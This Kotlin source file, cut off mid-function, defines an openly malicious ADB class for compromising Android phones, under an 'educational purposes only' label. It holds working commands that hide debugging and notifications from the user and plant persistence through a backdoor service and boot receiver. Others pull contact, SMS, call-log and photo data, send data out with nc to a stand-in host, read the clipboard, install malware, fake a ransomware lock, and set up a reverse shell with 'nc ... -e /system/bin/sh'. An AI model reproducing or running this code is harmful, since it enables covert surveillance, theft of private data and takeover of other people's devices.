package Src.ADB

import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.InetAddress
import java.util.concurrent.*
import java.util.regex.Pattern
import Src.Utils.Logger
import kotlin.random.Random
import java.io.File

/**
 * A malicious ADB interface with advanced features for stealth, persistence, evasion, and control,
 * including improved IP tracing capabilities.
 * For educational purposes only.
 */
class MaliciousADBBase {

    private val logger = Logger() // Silent logging to attacker-controlled server or file
    private val executor = Executors.newSingleThreadExecutor()
    private val config = MaliciousConfig()

    /**
     * Configuration for malicious operations.
     */
    data class MaliciousConfig(
        val tcpPort: Int = 5555,
        val commandTimeoutSeconds: Long = 10,
        val silentMode: Boolean = true, // Suppress UI and notifications
        val obfuscationDelayMs: Long = Random.nextLong(100, 1000) // Random delays to evade detection
    )

    /**
     * Exception for command failures (kept minimal to avoid detection).
     */
    class ADBExploitException(message: String, cause: Throwable? = null) : RuntimeException(message, cause)

    // --- Stealth, Persistence, and Initial Actions ---

    /** Enables stealth mode and sets up initial access. */
    fun prepareAttack() {
        enableStealthMode()
        establishPersistentAccess()
        schedulePersistentTask() // Attempt to schedule a persistent task
        enableBootPersistence() // Attempt to enable boot persistence
        val downloads = listFiles("/sdcard/Download")
        logger.info("Listing downloads after establishing access: $downloads")
        trackIPAddress() // Initiate IP address tracking
    }

    /** Enables stealth mode to hide ADB activity from the user. */
    private fun enableStealthMode() {
        executeBatch(listOf(
            "adb shell settings put global adb_enabled 0", // Disable ADB visibility
            "adb shell settings put global development_settings_enabled 0",
            "adb shell settings put global usb_debugging_enabled 0",
            "adb shell settings put global notification_access 0", // Suppress notifications
            "adb shell input keyevent 26" // Turn off screen to avoid user suspicion
        )) { "Enabling stealth mode" }
    }

    /** Sets up persistent wireless access without user interaction. */
    private fun establishPersistentAccess() {
        execute("adb tcpip ${config.tcpPort}") { "Setting up TCP/IP on port ${config.tcpPort}" }
        val ipOutput = execute("adb shell ip -f inet addr show wlan0") { "Fetching device IP" }
        val ipAddress = parseIpAddress(ipOutput) ?: return
        execute("adb connect $ipAddress:${config.tcpPort}") { "Establishing connection to $ipAddress:${config.tcpPort}" }
        // Install a background service for persistence (simulated)
        execute("adb shell am start-service -n com.malicious/.BackdoorService") { "Installing backdoor service" }
    }

    /** Lists files and directories on the device (integrated). */
    private fun listFiles(path: String = "/sdcard/"): String {
        return execute("adb shell ls -l '$path'") { "Listing files in $path" }
    }

    /** Pulls a file or directory from the device to the local machine (can be used stealthily). */
    private fun stealthPullFile(devicePath: String, localPath: String) {
        execute("adb pull '$devicePath' '$localPath'") { "Pulling '$devicePath' to '$localPath'" }
    }

    // --- Improved Persistence Mechanisms ---

    /** Simulates setting up a recurring task using AlarmManager (requires a receiver on the device). */
    fun schedulePersistentTask() {
        val alarmId = Random.nextInt(1000, 9999)
        val intentAction = "com.malicious.ACTION_PERSISTENT"
        val command = "adb shell am set-alarm -c -a '$intentAction' -w 60 com.malicious" // Trigger every minute
        execute(command) { "Scheduling persistent task with AlarmManager (ID: $alarmId, Action: $intentAction)" }
        logger.info("Note: This requires a receiver on the device to handle the '$intentAction'.")
    }

    /** Attempts to start a service after boot (device-specific and might require root). */
    fun enableBootPersistence() {
        // This often involves modifying system settings or files and might require root
        val command = "adb shell su -c 'pm enable com.malicious/.BootReceiver'" // Example enabling a broadcast receiver
        execute(command) { "Attempting to enable boot persistence via BootReceiver" }
        logger.info("Note: This requires a BootReceiver component in the malicious application's manifest.")
    }

    // --- Advanced Data Exfiltration Techniques ---

    /** Simulates sending a small SMS with extracted data. */
    fun sendStealthSMS(phoneNumber: String, data: String) {
        val command = "adb shell am start -a android.intent.action.SENDTO -d sms:$phoneNumber --es sms_body \"$data\" --ez android.intent.extra.TEXT_ONLY true --ez android.intent.extra.SEND_EMPTY_BODY true"
        execute(command) { "Attempting to send stealth SMS to $phoneNumber with data: $data" }
        logger.info("Note: SMS sending might require permissions and could be visible to the user.")
    }

    /** Simulates uploading data to a (fake) cloud service (requires network access and implementation). */
    fun uploadDataStealthily(data: String, uploadUrl: String = "http://fake-cloud.com/upload") {
        logger.info("Simulating stealthy upload of data to $uploadUrl: $data")
        // In a real scenario, this would involve network requests from the device
        execute("adb shell sh -c 'echo \"$data\" | nc $uploadUrl 80'") { "Simulating data upload" }
        logger.info("Note: This is a simulation and requires network capabilities on the device.")
    }

    // --- Targeted Data Extraction ---

    /** Simulates extracting specific contacts (requires database interaction on the device). */
    fun extractTargetedContacts(keywords: List<String>): String {
        logger.info("Simulating targeted contact extraction with keywords: $keywords")
        // In a real scenario, this would involve querying the contacts database
        val command = "adb shell sh -c 'sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db \"SELECT display_name FROM contacts WHERE display_name LIKE \\'%${keywords.joinToString("%' OR display_name LIKE '%")}%'\"'"
        return execute(command) { "Simulating extraction of contacts matching keywords" }
    }

    // --- Keylogging and Credential Harvesting (Conceptual - Requires Permissions/Root) ---
    // Implementing actual keylogging or clipboard monitoring via ADB is complex and often permission-restricted.
    // These functions serve as conceptual examples.

    fun startKeylogger() {
        logger.warning("Keylogging via ADB without root or specific permissions is very limited.")
        logger.info("Conceptual: Would involve running a service on the device to capture input events.")
        // Example (very basic and likely ineffective):
        // execute("adb shell input listen") { "Attempting to start basic input listener" }
    }

    fun readClipboard() {
        logger.warning("Clipboard access via ADB without specific tools or root is often restricted.")
        val command = "adb shell service call clipboard 2 i:10 | toybox cut -d '\"' -f2 | sed 's/ //g'"
        val clipboardData = execute(command) { "Attempting to read clipboard data (may not work)" }
        logger.info("Clipboard data (attempted): $clipboardData")
    }

    // --- Data Theft with Potential Normal Actions ---

    /** Extracts all accessible sensitive data, potentially mixed with normal file operations. */
    fun exfiltrateData(destinationPath: String) {
        // Maybe start by checking some "normal" directories
        val downloadsList = listFiles("/sdcard/Download")
        logger.info("Checked downloads: $downloadsList")

        val dataPaths = listOf(
            "/data/data/com.android.providers.contacts/databases/contacts2.db" to "$destinationPath/contacts.db",
            "/data/data/com.android.providers.telephony/databases/mmssms.db" to "$destinationPath/sms.db",
            "/data/data/com.android.providers.contacts/databases/calllog.db" to "$destinationPath/calllog.db",
            "/sdcard/DCIM/Camera" to "$destinationPath/photos",
            "/sdcard/Download" to "$destinationPath/downloads"
        )
        dataPaths.forEach { (src, dst) ->
            try {
                // Use the stealth pull for data exfiltration
                stealthPullFile(src, dst)
            } catch (e: ADBExploitException) {
                logger.warning("Failed to steal $src: ${e.message}")
            }
        }

        // Maybe clean up some temporary files that were created during the process
        execute("adb shell rm -rf /sdcard/temp_exfil_*") { "Cleaning up temporary exfiltration files" }
    }

    /** Extracts data from a specific path (tries root access if available). */
    private fun stealData(sourcePath: String, destinationPath: String) {
        val isRooted = isDeviceRooted()
        val command = if (isRooted) {
            "adb shell su -c cp $sourcePath /sdcard/temp && adb pull /sdcard/temp $destinationPath && adb shell rm /sdcard/temp"
        } else {
            "adb pull $sourcePath $destinationPath"
        }
        execute(command) { "Stealing data from $sourcePath to $destinationPath" }
    }

    /** Dumps system information (e.g., accounts, apps, settings). */
    fun dumpSystemInfo(destinationPath: String) {
        // Could precede this with a check for installed apps (a normal ADB function)
        val packageList = execute("adb shell pm list packages") { "Checking installed packages before dumping info" }
        logger.info("Installed packages: $packageList")

        executeBatch(listOf(
            "adb shell dumpsys account > $destinationPath/accounts.txt",
            "adb shell pm list packages -f > $destinationPath/packages.txt",
            "adb shell settings list global > $destinationPath/settings.txt",
            "adb shell getprop > $destinationPath/properties.txt"
        )) { "Dumping system info to $destinationPath" }
    }

    // --- Device Compromise with Potential Normal Actions ---

    /** Simulates a ransomware attack by locking the screen and displaying a fake message. */
    fun simulateRansomware() {
        // Could check device properties before locking
        val deviceModel = getDeviceModel()
        logger.info("Attempting ransomware on device: $deviceModel")

        executeBatch(listOf(
            "adb shell input keyevent 26", // Lock screen
            "adb shell am broadcast -a com.android.systemui.demo --es command enter --es mode ransom --es message 'Your device is locked! Pay 0.1 BTC to unlock.'"
        )) { "Simulating ransomware attack" }
    }

    /** Installs a malicious APK silently (requires root or debuggable device). */
    fun installMalware(apkPath: String) {
        // Could list existing apps before installing
        val initialApps = execute("adb shell pm list packages") { "Listing apps before install" }
        logger.info("Apps before install: $initialApps")

        execute("adb install -r $apkPath") { "Installing malicious APK: $apkPath" }
        execute("adb shell pm grant com.malicious android.permission.READ_SMS") { "Granting permissions to malware" }

        // Could check the newly installed package
        val finalApps = execute("adb shell pm list packages com.malicious") { "Checking if malware was installed" }
        logger.info("Apps after install: $finalApps")
    }

    /** Executes arbitrary shell commands to escalate privileges or disrupt the device. */
    fun executeMaliciousCommand(command: String) {
        val isRooted = isDeviceRooted()
        val finalCommand = if (isRooted) "adb shell su -c '$command'" else "adb shell $command"
        execute(finalCommand) { "Executing malicious command: $command" }
    }

    // --- Enhanced Evasion and Anti-Detection ---

    /** Adds random delays to evade detection. */
    private fun obfuscateExecution() {
        if (config.silentMode) {
            Thread.sleep(config.obfuscationDelayMs)
        }
    }

    /** Executes a command with a slightly different syntax. */
    fun executeObfuscatedCommand(command: String) {
        val parts = command.split(" ")
        val cmd = parts.first()
        val args = parts.drop(1).joinToString(";") // Using semicolon as a separator
        val finalCommand = "adb shell sh -c '$cmd $args'"
        execute(finalCommand) { "Executing obfuscated command: $finalCommand" }
    }

    /** Displays fake error messages to mislead the user. */
    fun displayFakeError() {
        execute("adb shell am start -a android.intent.action.VIEW -d 'https://fake-error.com/device_crash'") {
            "Displaying fake error message"
        }
    }

    // --- Improved Remote Control Capabilities ---

    /** Attempts to forward a local port to the device for a reverse shell (requires a listening server). */
    fun setupReverseShellForward(localPort: Int, devicePort: Int = 4444) {
        execute("adb forward tcp:$localPort tcp:$devicePort") { "Forwarding local port $localPort to device port $devicePort" }
        logger.info("Forwarding port $localPort on your machine to port $devicePort on the device.")
        logger.info("You'll need to run a listener (e.g., `nc -lvp $localPort`) on your machine and then execute a command on the device (e.g., `adb shell sh -c 'nc 127.0.0.1 $devicePort -e /system/bin/sh'` or `adb shell sh -c 'nc <your_ip> $devicePort -e /system/bin/sh'`).")
    }

    // --- Self-Destruction/Cleanup Mechanisms ---

    /** Attempts to clear data for a specific package as a form of cleanup. */
    fun attemptCleanup(packageName: String) {
        execute("adb shell pm clear '$packageName'") { "Attempting to clear data for package: $packageName" }
    }

    /** Attempts to remove a file or directory from the device. */
    fun attemptFileRemoval(path: String) {
        execute("adb shell rm -rf '$path'") { "Attempting to remove path: $path" }
    }

    // --- Improved IP Tracing ---

    /** Retrieves the device's current IP address. */
    fun getDeviceIpAddress(): String? {
        val output = execute("adb shell ip -f inet addr show wlan0") { "Getting device IP address" }
        return parseIpAddress(output)
    }

    /** Periodically tracks the device's IP address and logs changes. */
    fun trackIPAddress(intervalSeconds: Long = 60) {
        executor.submit {
            var currentIp = getDeviceIpAddress()
            if (currentIp != null) {
                logger.info("Initial IP Address: $currentIp")
            } else {
                logger.warning("Could not retrieve initial IP address.")
            }

            while (true) {
                Thread.sleep(intervalSeconds * 1000)
                val newIp = getDeviceIpAddress()
                if (newIp != null && newIp != currentIp) {
                    logger.warning("IP Address Changed: Old IP = $currentIp, New IP = $newIp")
                    currentIp = newIp
                } else if (newIp == null) {
                    logger.warning("Could not retrieve IP address during tracking.")
                }
            }
        }
        logger.info("IP address tracking started in the background.")
    }

    /** Attempts to get the device's public IP address (may require external tools on the device). */
    fun getPublicIpAddress(): String? {
        // This relies on the 'curl' command being available on the Android device
        val output = execute("adb shell curl -s ifconfig.me") { "Getting public IP address" }
        return if (output.isNotBlank() && !output.contains("not found")) {
            output.trim()
        } else {
            logger.warning("Could not retrieve public IP address (curl might not be available).")
            null
        }
    }

    // --- Device Information (Integrated) ---

    /** Gets the device model (integrated). */
    private fun getDeviceModel(): String {
        return execute("adb shell getprop ro.product.model") { "Getting device model" }.trim()
    }

    // --- Status Checks ---

    /** Checks if the device is rooted. */
    fun isDeviceRooted(): Boolean {
        return try {
            execute("adb shell su -c whoami") { "Checking root status" }.contains("root", ignoreCase = true)
        } catch (e: ADBExploitException) {
            false
        }
    }

    /** Checks if ADB is accessible (minimal check to avoid detection). */
    fun isAdbAccessible(): Boolean {
        return try {
            execute("
